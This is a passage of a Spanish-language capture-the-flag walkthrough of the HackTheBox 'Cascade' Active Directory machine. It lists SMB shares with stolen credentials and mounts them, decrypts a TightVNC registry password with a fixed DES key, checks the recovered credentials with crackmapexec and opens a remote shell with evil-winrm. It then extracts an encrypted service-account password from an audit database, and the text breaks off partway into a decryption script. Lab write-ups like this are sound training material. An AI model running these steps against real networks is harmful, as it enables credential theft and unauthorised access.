        Audit&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que tenemos los Permisos de lectura para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data, NETLOGON, print$, SYSVOL&lt;/code&gt; … 
Usamos la tool &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; para listar el Recurso en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient //10.10.10.182/Data &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;r.thompson%rY4n5eva&apos;&lt;/span&gt;                                                                                                  
Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Mon Jan 27 04:27:34 2020
  ..                                  D        0  Mon Jan 27 04:27:34 2020
  Contractors                         D        0  Mon Jan 13 02:45:11 2020
  Finance                             D        0  Mon Jan 13 02:45:06 2020
  IT                                  D        0  Tue Jan 28 19:04:51 2020
  Production                          D        0  Mon Jan 13 02:45:18 2020
  Temps                               D        0  Mon Jan 13 02:45:15 2020
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos diferentes Directorios .. asique procedemos a crearnos una montura en un directorio que vamos a crear llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mnt&lt;/code&gt; para 
listar toda la informcion o data de manera mas comoda.&lt;/p&gt;

&lt;p&gt;Creando la montura con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cifs -t&lt;/code&gt; en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-o&lt;/code&gt; le pasamos el nombre de usuario, la password, el dominio y le decimos con permisos de R y W (lectura y Escritura)&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; cifs //10.10.10.182/Data /mnt/ &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;r.thompson,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;rY4n5eva,domain&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;casscade.local,rw
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez montada la montura, procedemos a listar todo el contenido con el commando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TREE&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tree /mnt                                                                                                                                                    

/mnt
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Meetin_Notes_June_2018_html&lt;/code&gt; encontramos cierta informacion sensible&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;p&amp;gt;-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;security logs etc. &lt;span class=&quot;s2&quot;&gt;&quot;Username is TempAdmin (password is the same as the normal admin account password).&quot;&lt;/span&gt; &amp;lt;/p&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Prcedemos a Copiarnos del Recurso Compatido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data/IT/Temp/s.smith&lt;/code&gt;  el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VNC Install.reg&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#cp /mnt/IT/Temp/s.smith/VNC\ Install.reg .&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#ls                                                                                                                                                                            &lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&apos;VNC Install.reg&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a realizar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;c&quot;&gt;# cat VNC\ Install.reg                                                                 &lt;/span&gt;
��Windows Registry Editor Version 5.00

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;ightVNC]

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;HKEY_LOCAL_MACHINE&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;OFTWARE&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;ightVNC&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;erver]
&lt;span class=&quot;s2&quot;&gt;&quot;ExtraPorts&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;QueryTimeout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:0000001e
&lt;span class=&quot;s2&quot;&gt;&quot;QueryAcceptOnTimeout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;LocalInputPriorityTimeout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000003
&lt;span class=&quot;s2&quot;&gt;&quot;LocalInputPriority&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;BlockRemoteInput&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;BlockLocalInput&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;IpAccessControl&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;RfbPort&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:0000170c
&lt;span class=&quot;s2&quot;&gt;&quot;HttpPort&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:000016a8
&lt;span class=&quot;s2&quot;&gt;&quot;DisconnectAction&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;AcceptRfbConnections&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;UseVncAuthentication&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;UseControlAuthentication&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;RepeatControlAuthentication&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;LoopbackOnly&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;AcceptHttpConnections&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;LogLevel&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;EnableFileTransfers&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;RemoveWallpaper&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;UseD3D&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;UseMirrorDriver&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;EnableUrlParams&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;c&quot;&gt;#  &quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;AlwaysShared&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;NeverShared&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;DisconnectClients&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;PollingInterval&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:000003e8
&lt;span class=&quot;s2&quot;&gt;&quot;AllowLoopback&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;VideoRecognitionInterval&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000bb8
&lt;span class=&quot;s2&quot;&gt;&quot;GrabTransparentWindows&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;SaveLogToAllUsersPath&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;RunControlInterface&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000001
&lt;span class=&quot;s2&quot;&gt;&quot;IdleTimeout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dword:00000000
&lt;span class=&quot;s2&quot;&gt;&quot;VideoClasses&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;VideoRects&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Intentamos decodarla con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd -ps -r&lt;/code&gt; pero no nos devuelve nada legible y claro&lt;/p&gt;

&lt;p&gt;Buscamos por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VNC Decryp hex password&lt;/code&gt; en Google&lt;/p&gt;

&lt;p&gt;Encontramos el siguiente comando para hacerlo&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv                                                                                              1 ⚙&lt;/span&gt;
00000000  73 54 33 33 33 76 65 32                        &lt;span class=&quot;s2&quot;&gt;&quot;   |sT333ve2|      &quot;&lt;/span&gt;
00000008
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a almacenar las credenciales para el usuario:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.smith:sT333ve2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Chequeamos si este usuario pertenece al &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Grupo Remote Managment&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2                                                                                                                                                                              1 ⚙&lt;/span&gt;
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:CASC-DC1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:cascade.local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] cascade.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;.smith:sT333ve2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos conectamos como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.smith&lt;/code&gt; usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm.rb&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2                                                                                                                                                                                1 ⚙&lt;/span&gt;

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;.smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a enumerar el sistema:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;.smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir


    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;.smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-ar---&lt;/span&gt;        1/18/2022   1:00 PM             34 user.txt
&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;         2/4/2021   4:24 PM           1031 WinDirStat.lnk


&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;.smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;user.txt
44ee5ac9a106aa0c5aa8488xxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a ver a los grupos que pertenece el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s.smith&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;.smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt; net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User&lt;span class=&quot;s1&quot;&gt;&apos;s comment &apos;&lt;/span&gt;
Country code                 000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;System Default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Account active               Yes
Account expires              Never

Password last &lt;span class=&quot;nb&quot;&gt;set            &lt;/span&gt;1/28/2020 7:58:05 PM
Password expires             Never
Password changeable          1/28/2020 7:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/28/2020 11:26:39 PM

Logon hours allowed          All

&lt;span class=&quot;c&quot;&gt;# Local Group Memberships      *Audit Share          *IT&lt;/span&gt;
                             &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Remote Management Use
Global Group memberships     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Domain Users
The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Vemos que pertenecemos al Group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Audit Share&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IT&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -H 10.10.10.182  -u s.smith -p sT333ve2       &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.182:445        Name: cascade.local                                     
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        Audit&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a montarnos una Montura&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# mount -t cifs //10.10.10.182/AUDIT$ /mnt/ -o username=s.smith,password=sT333ve2,domain=casscade.local,rw&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# tree /mnt                                                                                                                                                                                                                           1 ⚙&lt;/span&gt;
/mnt
├── &lt;span class=&quot;s2&quot;&gt;&quot;CascAudit.exe&quot;&lt;/span&gt;
├── CascCrypto.dll
├── DB
│   └── &lt;span class=&quot;s2&quot;&gt;&quot;Audit.db&quot;&lt;/span&gt;
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll

3 directories, 8 files
                        
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a descargarnos el archiv “Audit.db” para ver si contiene informacion interesante.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#ls                                                                                                                                                                    &lt;/span&gt;
Audit.db  CascAudit.exe  MapAuditDrive.vbs  MapDataDrive.vbs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos el archivo “Audit.db”&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# file Audit.db                         &lt;/span&gt;
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a enumerar con SQLite 3.x&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# sqlite3 Audit.db &lt;/span&gt;

SQLite version 3.36.0 2021-06-18 18:36:39
Enter &lt;span class=&quot;s2&quot;&gt;&quot;.help&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage hints.
sqlite&amp;gt; .tables
DeletedUserAudit  Ldap              Misc            
sqlite&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; from Ldap&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;|cascade.local
sqlite&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encontramos una credencial en base64 para el user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArkSvc&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# echo &quot;BQO5l5Kj9MdErXx6Q6AGOw==&quot; | base64  -d                                                                                                                  &lt;/span&gt;

������D�|zC�&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Vemos que se nos devuelve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Data-No-Legible&lt;/code&gt; por lo que podemos pensar que la contraseña esta cifrada de alguna forma.&lt;/p&gt;

&lt;p&gt;Vemos que teniamos un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.exe&lt;/code&gt; en los recursos compartidos que podemos intentar a leer el codigo del binario de windows&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ls                                                                                              &lt;/span&gt;
Audit.db  &lt;span class=&quot;s2&quot;&gt;&quot;CascAudit.exe&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a pasarnos el Archivo CascAudit.exe a una maquina Windows con el Sofware &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DotUltimate&lt;/code&gt; para analizar el codigo&lt;/p&gt;

&lt;p&gt;Conseguimos ver que se esta untilizando un Cifrado CBC y encontramos una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Key&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Encontramos un Script para Desencryptar la password encontrada&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cat Decode_Pass.py                                                                                     130 ⨯ 1 ⚙&lt;/span&gt;
import pyaes
from &lt;span class=&quot;nb&quot;&gt;base64 &lt;/span&gt;import b64decode
&lt;span class=&quot;c&quot;&gt;# Variables&lt;/span&gt;
